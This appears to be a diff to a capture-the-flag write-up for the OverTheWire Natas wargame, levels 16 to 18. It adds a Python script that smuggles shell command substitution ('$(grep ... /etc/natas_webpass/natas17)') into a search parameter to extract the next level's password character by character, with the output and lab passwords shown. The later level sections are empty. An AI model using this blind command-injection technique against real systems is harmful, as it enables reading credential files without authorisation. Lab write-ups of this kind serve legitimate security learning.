@@ -807,11 +807,94 @@ https://overthewire.org/wargames/natas/natas15.html
 > URL:      http://natas16.natas.labs.overthewire.org
 
 ```python
+import natasX
+
+natas = natasX
+
+#print(natas.natasX(16, "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh", endpoint="/?needle=natas$(grep a /etc/natas_webpass/natas17)").text)
+w = ""
+
+'''
+for n in range(26):
+    if not natas.natasX(
+            16,
+            "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh",
+            endpoint=f'/?needle=natas$(grep {chr(65+n)} /etc/natas_webpass/natas17)'
+    ).text.__contains__("sonatas"):
+        w += chr(65+n)
+
+    if not natas.natasX(
+            16,
+            "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh",
+            endpoint=f'/?needle=natas$(grep {chr(97+n)} /etc/natas_webpass/natas17)'
+    ).text.__contains__("sonatas"):
+        w += chr(97+n)
+
+for n in range(10):
+    if not natas.natasX(
+            16,
+            "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh",
+            endpoint=f'/?needle=natas$(grep {chr(48+n)} /etc/natas_webpass/natas17)'
+    ).text.__contains__("sonatas"):
+        w += chr(48+n)
+
+'''
+
+w = "AbcdGgHhkmNnPQqrSsWw035789"
+x = ""
+
+for n in range(50):
+    for i in w:
+        if not natas.natasX(
+                16,
+                "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh",
+                endpoint=f'/?needle=natas$(grep ^{x}{i} /etc/natas_webpass/natas17)'
+        ).text.__contains__("sonatas"):
+            x += i
+            print(x)
+
+        if len(x) < n:
+            break
+
+print(x)
 ```
 
 **Output**
 
 ```html
+8
+8P
+8Ps
+8Ps3
+8Ps3H
+8Ps3H0
+8Ps3H0G
+8Ps3H0GW
+8Ps3H0GWb
+8Ps3H0GWbn
+8Ps3H0GWbn5
+8Ps3H0GWbn5r
+8Ps3H0GWbn5rd
+8Ps3H0GWbn5rd9
+8Ps3H0GWbn5rd9S
+8Ps3H0GWbn5rd9S7
+8Ps3H0GWbn5rd9S7G
+8Ps3H0GWbn5rd9S7Gm
+8Ps3H0GWbn5rd9S7GmA
+8Ps3H0GWbn5rd9S7GmAd
+8Ps3H0GWbn5rd9S7GmAdg
+8Ps3H0GWbn5rd9S7GmAdgQ
+8Ps3H0GWbn5rd9S7GmAdgQN
+8Ps3H0GWbn5rd9S7GmAdgQNd
+8Ps3H0GWbn5rd9S7GmAdgQNdk
+8Ps3H0GWbn5rd9S7GmAdgQNdkh
+8Ps3H0GWbn5rd9S7GmAdgQNdkhP
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
 ```
 
 ## Natas17
@@ -822,6 +905,23 @@ https://overthewire.org/wargames/natas/natas17.html
 > Username: natas17
 
 > URL:      http://natas17.natas.labs.overthewire.org
+
+```python
+```
+
+**Output**
+
+```html
+```
+
+## Natas18
+https://overthewire.org/wargames/natas/natas17.html
+
+> Natas Level 17 → Level 18
+
+> Username: natas18
+
+> URL:      http://natas18.natas.labs.overthewire.org
 
 ```python
 ```
